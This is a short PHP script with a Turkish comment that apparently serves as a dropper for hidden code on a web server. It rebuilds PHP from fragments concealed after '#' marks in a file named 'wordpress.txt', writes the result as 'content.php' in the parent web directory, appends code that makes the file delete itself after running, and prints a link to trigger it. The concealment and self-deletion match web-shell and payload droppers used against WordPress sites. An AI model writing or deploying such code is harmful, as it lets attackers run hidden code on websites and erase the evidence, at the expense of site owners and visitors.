﻿<?php
$lines = file('wordpress.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

foreach ($lines as &$line) {
    $line = explode('#', $line, 2)[1];
}

$output = "<?php\n";
$output .= $lines[0] . $lines[1] . "\n";
$output .= $lines[2] . "\n";
$output .= $lines[3] . $lines[4] . "\n";
$output .= $lines[5] . $lines[6] . "\n";
$output .= $lines[7] . "\n";
$output .= $lines[8] . "\n";

// Kendini imha eden kodu ekle
$output .= "if (file_exists(__FILE__)) { unlink(__FILE__); }\n";
$output .= "?>";

$outputFile = dirname(__DIR__) . '/content.php';
file_put_contents($outputFile, $output);

$baseUrl = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://{$_SERVER['HTTP_HOST']}";
$relativePath = dirname($_SERVER['SCRIPT_NAME'], 2) . '/content.php';
$fileUrl = rtrim($baseUrl, '/') . '/' . ltrim($relativePath, '/');

echo "<a href=\"$fileUrl\" target=\"_blank\">...</a>";
?>